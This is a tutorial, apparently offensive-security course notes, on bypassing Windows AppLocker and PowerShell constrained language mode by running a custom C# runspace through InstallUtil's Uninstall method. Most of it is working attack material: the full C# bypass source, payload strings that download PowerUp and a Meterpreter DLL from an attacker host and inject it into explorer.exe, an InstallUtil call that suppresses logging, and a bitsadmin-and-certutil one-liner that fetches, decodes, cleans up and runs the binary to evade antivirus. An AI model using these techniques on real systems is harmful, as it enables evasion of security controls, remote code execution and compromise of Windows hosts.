PowerShell.exe is essentially a GUI application handling input and output. The real functionality lies inside the System.Management.Automation.dll managed DLL, which PowerShell.exe calls to create a runspace.
It is possible to leverage multithreading and parallel task execution through either Jobs or Runspaces. The APIs for creating a runspace are public and available to managed code written in C#.
This means we could code a C# application that creates a custom PowerShell runspace and executes our script inside it. This is beneficial since, custom runspaces are not restricted by AppLocker.
we can construct a constrained language mode bypass to allow arbitrary PowerShell execution.

We will have to bypass AppLocker executable rules to execute this C# code, we ca use native Windows applications( InstallUtil) that can be abused to bypass AppLocker by fooling the filter driver.
we will leverage InstallUtil, a command-line utility that allows us to install and uninstall server resources by executing the installer components in a specified assembly. This Microsoft-supplied tool obviously has legitimate uses, but we can abuse it to execute arbitrary C# code.

To use InstallUtil in this way, we must put the code we want to execute inside either the install or uninstall methods of the installer class.

We are only going to use the uninstall method since the install method requires administrative privileges to execute.

create a new C# Console App project, we'll create a runspace through the CreateRunspace method of the System.Management.Automation.Runspaces namespace and Unfortunately, Visual Studio can not locate System.Management.Automation.Runspaces.
to resolve this, we must manually add the assembly reference, C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35 folder where we will select System.Management.Automation.dll.
Also refer System.Configuration.Install namespace, Assemblies menu > System.Configuration.Install

Although our code uses both the Main method and the Uninstall method, content in the Main method is not important in this example. However, the method itself must be present in the executable.
Since the content of the Main method is not part of the application whitelisting bypass, we could use it for other purposes, like bypassing antivirus.

Inside the Uninstall method, we can execute arbitrary C# code i.e custom runspace code. 

Custom runspace C# code inside Uninstall method:

      using System;
      using System.Management.Automation;
      using System.Management.Automation.Runspaces;
      using System.Configuration.Install;
      
      namespace Bypass
      {
          class Program
          {
              static void Main(string[] args)
              {
                  Console.WriteLine("This is the main method which is a decoy");
                  ***<comment>Since the content of the Main method is not part of the application whitelisting bypass, we could use it for other purposes, like bypassing antivirus.<comment>***
                  
              }
          }
      
          [System.ComponentModel.RunInstaller(true)]
          public class Sample : System.Configuration.Install.Installer
          {
              public override void Uninstall(System.Collections.IDictionary savedState)
              {
                  String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\test.txt";
                  
                  ***<comment>String cmd = "(New-Object System.Net.WebClient).DownloadString('http://<kali ip>/PowerUp.ps1') | IEX; Invoke-AllChecks | Out-File -FilePath C:\\test.txt"; <comment>***

                  ***<comment>Reflectively loading Meterpreter DLL into explorer.exe: 
                  
                  String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://<kali ip>/met.dll');(New-Object System.Net.WebClient).DownloadString('http://<kali ip>/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";
                  
                  <comment>***
                  
                  Runspace rs = RunspaceFactory.CreateRunspace();
                  rs.Open();
      
                  PowerShell ps = PowerShell.Create();
                  ps.Runspace = rs;
      
                  ps.AddScript(cmd);
      
                  ps.Invoke();
      
                  rs.Close();
              }
          }
      }

Before compiling the project, we'll switch from "Debug" to "Release" mode and select 64-bit for compilation.

To trigger our constrained language mode bypass code, we must invoke it through InstallUtil with /logfile to avoid logging to a file, /LogToConsole=false to suppress output on the console and /U to trigger the Uninstall method

    C:\Users\>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Bypass.exe

At this point, it would be possible to reuse this tradecraft with the Microsoft Word macros we developed earlier since they are not limited by AppLocker. Instead of using WMI to directly start a PowerShell process and download the shellcode runner from our Apache web server, we could make WMI execute InstallUtil and obtain the same result despite AppLocker.

The compiled C# file has to be on disk when InstallUtil is invoked. This requires two distinct actions. First, we must download an executable, and secondly, we must ensure that it is not flagged by antivirus, neither during the download process nor when it is saved to disk. we can use other native Windows binaries, which are whitelisted by default.

To attempt to bypass anitvirus, we are going to obfuscate the executable while it is being downloaded with Base64 encoding and then decode it on disk. Well use the native certutil3 tool to perform the encoding and decoding and bitsadmin for the downloading.

Base64 encoding the executable with certutil: 

      cmd> certutil -encode C:\Users\\source\repos\Bypass\Bypass\bin\x64\Release\Bypass.exe file.txt

Certutil can also be used to download files over HTTP(S), but this triggers antivirus due to its widespread malicious usage. 

Complete combined command to download, decode and execute the bypass: 

      cmd>bitsadmin /Transfer myJob http://<kali ip>/file.txt C:\users\enc.txt && certutil -decode C:\users\enc.txt C:\users\Bypass.exe && del C:\users\enc.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\Bypass.exe


